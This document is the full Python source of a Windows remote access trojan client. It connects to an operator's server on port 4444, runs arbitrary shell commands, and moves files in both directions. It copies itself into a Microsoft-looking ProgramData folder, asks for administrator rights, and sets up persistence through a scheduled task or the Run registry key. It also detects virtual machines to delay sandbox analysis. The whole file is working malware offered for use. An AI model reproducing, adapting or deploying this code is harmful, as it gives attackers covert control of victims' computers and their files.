import socket
import subprocess
import json
import os
import sys
import time
import random
import base64
import winreg
import shutil
import ctypes


APP_NAME = "Client"
SERVER_IP = "SERVER_IP"  # Replace with your server's IP address
SERVER_PORT = 4444

_VM_MARKERS = ("vmware", "virtualbox", "qemu", "kvm", "xen", "bochs",
               "parallels", "hyper-v", "virtual machine", "vbox", "innotek")

INSTALL_DIR  = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),"Microsoft","RemoteAdmin")
INSTALL_PATH = os.path.join(INSTALL_DIR, "remote_admin_client.exe")
TASK_NAME    = APP_NAME
REG_KEY      = r"Software\Microsoft\Windows\CurrentVersion\Run"


def _reg_get(root, path, name):
    try:
        with winreg.OpenKey(root, path) as key:
            value, _ = winreg.QueryValueEx(key, name)
        return value
    except OSError:
        return None


def _detect_vm() -> bool:
    try:
        bios = r"HARDWARE\DESCRIPTION\System\BIOS"
        vals = [
            _reg_get(winreg.HKEY_LOCAL_MACHINE, bios, "BIOSVendor") or "",
            _reg_get(winreg.HKEY_LOCAL_MACHINE, bios, "SystemManufacturer") or "",
            _reg_get(winreg.HKEY_LOCAL_MACHINE, bios, "SystemProductName") or "",
            _reg_get(winreg.HKEY_LOCAL_MACHINE, bios, "SystemFamily") or "",
        ]
        hay = " ".join(vals).lower()
        return any(m in hay for m in _VM_MARKERS)
    except Exception:
        return False


def self_relocate() -> bool:
    current = sys.executable
    if os.path.abspath(current) == os.path.abspath(INSTALL_PATH):
        return False
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        shutil.copy2(current, INSTALL_PATH)
        subprocess.Popen([INSTALL_PATH] + sys.argv[1:])
        sys.exit(0)
    except Exception:
        return False


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def relaunch_as_admin():
    """Requests elevated privileges; if the user declines the UAC prompt, 
        the program continues running without administrator privileges instead of exiting"""
    try:
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, "", None, 1
        )
        if int(ret) > 32:
            sys.exit(0)
    except Exception:
        pass


def register_autostart():
    """Creates an auto-start entry. Tries Task Scheduler first (admin), 
        with a fallback to the HKCU Run key"""
    try:
        subprocess.run(
            ["schtasks", "/create",
             "/tn", TASK_NAME,
             "/tr", f'"{INSTALL_PATH}"',
             "/sc", "onlogon",
             "/rl", "highest",
             "/f"],
            capture_output=True, check=True
        )
        return
    except (OSError, subprocess.CalledProcessError):
        pass
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0,
                            winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, INSTALL_PATH)
    except OSError:
        pass


class Client:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    raise ConnectionResetError("connection closed")
                json_data += chunk
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    break
                elif command[0] == "cd" and len(command) > 1:
                    result = self.change_working_directory_to(command[1])
                elif command[0] == "download" and len(command) > 1:
                    result = self.read_file(command[1])
                elif command[0] == "upload" and len(command) > 1:
                    result = self.write_file(command[1], command[2])
                else:
                    result = self.execute_system_command(command)

                if isinstance(result, bytes):
                    result = result.decode(errors="replace")
                self.reliable_send(result)
            except Exception:
                self.reliable_send("[-] Error during command execution")


if __name__ == "__main__":
    if os.path.abspath(sys.executable) != os.path.abspath(INSTALL_PATH):
        if not is_admin():
            relaunch_as_admin()
    self_relocate()
    register_autostart()
    if _detect_vm():
        time.sleep(random.uniform(180, 600))
    client = Client(SERVER_IP, SERVER_PORT)
    client.run()